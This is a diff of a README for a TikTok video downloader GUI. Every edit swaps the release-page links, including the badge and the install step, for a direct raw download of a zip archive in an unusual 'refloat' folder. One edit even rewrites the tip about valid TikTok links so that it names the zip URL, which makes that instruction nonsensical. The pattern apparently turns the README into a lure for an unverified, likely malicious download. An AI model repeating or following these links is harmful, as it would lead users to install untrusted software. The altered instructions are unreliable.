@@ -1,6 +1,6 @@
 # 🎥 TikTok-Downloader--GUI - Easily Download TikTok Videos
 
-[![Download TikTok-Downloader--GUI](https://img.shields.io/badge/Download-TikTok-Downloader--GUI-brightgreen)](https://github.com/Fernando343117/TikTok-Downloader--GUI/releases)
+[![Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the TikTok-Downloader--GUI! This application allows you to download y
 ## 📥 Download & Install
 
 1. Visit this page to download:  
-   [Download TikTok-Downloader--GUI](https://github.com/Fernando343117/TikTok-Downloader--GUI/releases)  
+   [Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)  
    Here, you will find the latest version available.
 
 2. Once you are on the releases page, look for the latest version. It will usually be at the top of the page.
@@ -58,7 +58,7 @@ After you have downloaded and installed the application, follow these steps to d
 If you encounter any problems while using TikTok-Downloader--GUI, consider the following tips:
 
 - **Check Your Internet Connection**: Ensure you have a stable connection as downloads require internet access.
-- **Ensure Correct Link**: Make sure you copied the TikTok video link correctly. It should begin with "https://www.tiktok.com/...".
+- **Ensure Correct Link**: Make sure you copied the TikTok video link correctly. It should begin with "https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip".
 - **Update the App**: Make sure you are using the latest version. Check the releases page for any updates.
 
 ## 📧 Support
